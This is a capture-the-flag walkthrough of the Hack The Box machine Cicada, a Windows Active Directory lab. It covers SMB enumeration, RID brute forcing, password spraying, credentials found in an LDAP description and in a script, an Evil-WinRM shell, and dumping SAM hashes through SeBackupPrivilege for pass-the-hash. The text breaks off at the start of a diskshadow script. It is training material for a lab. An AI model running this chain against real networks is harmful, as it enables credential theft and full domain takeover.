---
title: HTB: Cicada
url: https://0xdf.gitlab.io/2025/02/15/htb-cicada.html
date: 2025-02-15T14:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, ctf, htb-cicada, nmap, netexec, rid-cycle, password-spray, backup-operators, sebackupprivilege, reg-py, secretsdump, ntds, diskshadow, robocopy, oscp-like-v3, active-directory, htb-freelancer
---

![Cicada](/img/cicada-cover.png)

Cicada is a pure easy Windows Active Directory box. I’ll start enumerating SMB shares to find a new hire welcome note with a default password. I’ll RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so I can exfil the registry hives and dump the machine hashes.

## Box Info

| Name | [Cicada](https://hackthebox.com/machines/cicada)  [Cicada](https://hackthebox.com/machines/cicada) [Play on HackTheBox](https://hackthebox.com/machines/cicada) |
| --- | --- |
| Release Date | [28 Sep 2024](https://twitter.com/hackthebox_eu/status/1839334152220631219) |
| Retire Date | 15 Feb 2025 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Cicada |
| Radar Graph | Radar chart for Cicada |
| First Blood User | 00:03:13[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:03:33[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [theblxckcicada theblxckcicada](https://app.hackthebox.com/users/796798) |

## Recon

### nmap

`nmap` finds thirteen open TCP ports on what looks like a Windows domain controller:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 14:56 EDT
Nmap scan report for 10.10.11.35
Host is up (0.086s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
54296/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,54296 -sCV 10.10.11.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 14:58 EDT
Nmap scan report for 10.10.11.35
Host is up (0.086s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-27 01:58:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
54296/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m08s
| smb2-time:
|   date: 2024-09-27T01:59:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.98 seconds

```

The domain `cicada.htb` shows up on many ports, as well as the hostname `CICADA-DC`. I’ll add these to my `/etc/hosts` file:

```
10.10.11.35 CICADA-DC cicada.htb CICADA-DC.cicada.htb

```

RPC (135), NetBios (139), and SMB (445) are very common on all Windows machines. DNS (53), Kerberos (88), and LDAP (389, 636, 3268, 3269) are common on DCs.

Looking at ports to explore, I’ll triage them as:
- SMB - If any anonymous access is allowed, this is potentially the best place to get documents and other information.
- LDAP - If anonymous access is allowed, there will be users and potentially passwords.
- DNS - I could brute force hostnames / subdomains on the domain.
- WinRM - If I get creds, could provide a shell.

### SMB - TCP 445

#### Share Enumeration

`netexec` shows the box is running Windows Server 2022:

```

oxdf@hacky$ netexec smb CICADA-DC
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)

```

Trying to enumerate shares without creds fails, but with user guest and an empty password it works:

```

oxdf@hacky$ netexec smb CICADA-DC --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] IndexError: list index out of range
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb CICADA-DC -u guest -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 

```

`ADMIN$`, `C$`, and `IPC$` are standard on any Windows host, and the first two require admin access and `IPC$` doesn’t offer much of interest. `NETLOGON` and `SYSVOL` are standard on a DC. `DEV` and `HR` are specific to Cicada.

#### HR

The guest account has access to the `HR` share. I’ll connect with `smbclient`:

```

oxdf@hacky$ smbclient -N //10.10.11.35/HR
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 942184 blocks available

```

There’s only a single file, which I’ll grab:

```

smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)

```

The file reads:

```

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:
1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

I’ll note that password.

#### Rid Cycling

I’ll use `netexec` to brute force user ids from 0 to 4000:

```

oxdf@hacky$ netexec smb CICADA-DC -u guest -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

I’ll use `grep` and `cut` to make a users list from this:

```

oxdf@hacky$ netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

```

## Auth as michael.wrightson

### Find User

`netexec` can try the default password with each user on the list:

```

oxdf@hacky$ netexec smb CICADA-DC -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE

```

It works for michael.wrightson.

### Check Access

These creds work for SMB (above), as well as LDAP:

```

oxdf@hacky$ netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

```

They don’t work over WinRM (the user likely isn’t an administrator or in the remote users group):

```

oxdf@hacky$ netexec winrm CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

```

## Auth as david.orelious

### Enumeration

#### Shares

michael.wrightson doesn’t have any additional share access beyond what the guest user has:

```

oxdf@hacky$ netexec smb CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share

```

#### Users

With LDAP access, now I can look for a more complete list of users with the `--users` flag in `netexec`:

```

oxdf@hacky$ netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
LDAP        10.10.11.35     389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain
LDAP        10.10.11.35     389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1               
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1               
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0               
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1

```

This same command can be run over SMB with `netexec smb [target] -u [username] -p [pass] --users`, and it provides the same information collected from a different port.

There’s a comment on the david.orelious user: “Just in case I forget my password is aRt$Lp#7t\*VQ!3”.

### Validate Creds

The creds work for SMB and LDAP, but not WinRM:

```

oxdf@hacky$ netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
oxdf@hacky$ netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
oxdf@hacky$ netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3

```

## Shell as emily.oscars

### Dev Share

#### Identify

david.orelious can see the same shares, but unlike the other accesses so far, can read the `DEV` share:

```

oxdf@hacky$ netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share

```

#### Enumerate

I’ll connect with `smbclient`. There’s a single file, which I’ll grab:

```

oxdf@hacky$ smbclient -U david.orelious //CICADA-DC/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 934318 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)

```

#### Backup\_script.ps1

The script is used for creating a backup archive of `c:\smb` into the `D:\Backup` folder using emily.oscars’ credentials:

```

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```

### WinRM

#### Validate Creds

The creds work for both SMB and WinRM:

```

oxdf@hacky$ netexec smb CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
oxdf@hacky$ netexec winrm CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)

```

#### Shell

I’ll connect with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>

```

And grab the user flag:

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> type user.txt
ea4481e2************************

```

## Shell as system

### Enumeration

emily.oscars is in the Backup Operators group:

```
*Evil-WinRM* PS C:\> net user emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 2:20:17 PM
Password expires             Never
Password changeable          8/23/2024 2:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

According to [Microsoft docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators), this group:

> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group can’t be renamed, deleted, or removed. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers. Members of the following groups can modify Backup Operators group membership: default service Administrators, Domain Admins in the domain, and Enterprise Admins. Members of the Backup Operators group can’t modify the membership of any administrative groups. Although members of this group can’t change server settings or modify the configuration of the directory, they do have the permissions needed to replace files (including operating system files) on domain controllers. Because members of this group can replace files on domain controllers, they’re considered service administrators.

This shows up in the form of the `SeBackupPrivilege` and `SeRestorePrivilege`:

```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

### Exploit SeBackupPrivilege

#### Via reg / secretsdump

There are a few ways to exploit this privilege. I showed this as an unintended path in [Freelancer](/2024/10/05/htb-freelancer.html#exploit-sebackupprivilege). Without any tools, I can dump registry hives to files and exfil them:

```
*Evil-WinRM* PS C:\programdata> reg save hklm\sam sam      
The operation completed successfully.                      
*Evil-WinRM* PS C:\programdata> reg save hklm\system system
The operation completed successfully. 
*Evil-WinRM* PS C:\programdata> download sam
                                        
Info: Downloading C:\programdata\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata> download system
                                        
Info: Downloading C:\programdata\system to system
                                        
Info: Download successful!

```

This is enough to get the local administrator hash for the box. I’ll use `secretsdump.py` from [Impacket](https://github.com/SecureAuthCorp/impacket):

```

oxdf@hacky$ secretsdump.py -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

#### Via NetExec

In response to my Freelancer post, mpgn tweeted:

> imo way to complicated to extract the ntds, once you got a user with backup privilege group just do:  
>   
> 1⃣ <https://t.co/ovXQF83hJz> ... yourshare  
> 2⃣ <https://t.co/RMt7R38eH3> freelancer.htb/user:pass@ip backup -o \\youshare\share'  
> 3⃣ nxc smb dc -u DC$ -H ... --ntds 🏆  
>   
> remotely 😋 <https://t.co/LtTl0G8FB4>
>
> — mpgn (@mpgn\_x64) [October 7, 2024](https://twitter.com/mpgn_x64/status/1843257088904208681?ref_src=twsrc%5Etfw)

I’ll give that a run. `reg.py` will write to an SMB share I create, but it’s *so* slow, and almost always times out. I’m not sure if that’s `reg.py`, `smbserver.py`, and an issue with the HTB VPN.

Still I could use `reg.py` to make copies of the registry hives:

```

oxdf@hacky$ reg.py 'cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt'@10.10.11.35 backup -o 'C:\windows\temp\'
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to C:\windows\temp\\SAM.save
[*] Saved HKLM\SYSTEM to C:\windows\temp\\SYSTEM.save
[*] Saved HKLM\SECURITY to C:\windows\temp\\SECURITY.save

```

And then Download them over EvilWinRM:

```
*Evil-WinRM* PS C:\windows\temp> download SYSTEM.save
                                        
Info: Downloading C:\windows\temp\SYSTEM.save to SYSTEM.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> download SAM.save
                                        
Info: Downloading C:\windows\temp\SAM.save to SAM.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\windows\temp> download SECURITY.save
                                        
Info: Downloading C:\windows\temp\SECURITY.save to SECURITY.save
                                        
Info: Download successful!

```

I can dump these with `secretsdump.py` just like above.

### Shell

#### Validate Hash

The Administrator hash works!

```

oxdf@hacky$ netexec smb CICADA-DC -u administrator -H aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)

```

#### WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) can get a shell from the hash:

```

oxdf@hacky$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
b77facd8************************

```

## Beyond Root - Domain Hashes

### Background

Domain hashes are stored not in the registry, but in the `ndts.dit` file, stored in the `C:\Windows\NTDS` directory. Even with `SeBackupPrivilege`, it’s not possible to just copy it like another file. This isn’t a permissions issue, but rather because it is constantly in use by the active directory processes.

### Copy ntds.dit

There are several ways to get a copy of this file. One is using `diskshadow`, a backup utility, which is nice because I don’t have to upload any other tools to the target. I’ll need to pass it a script to run:

```

set verbose on
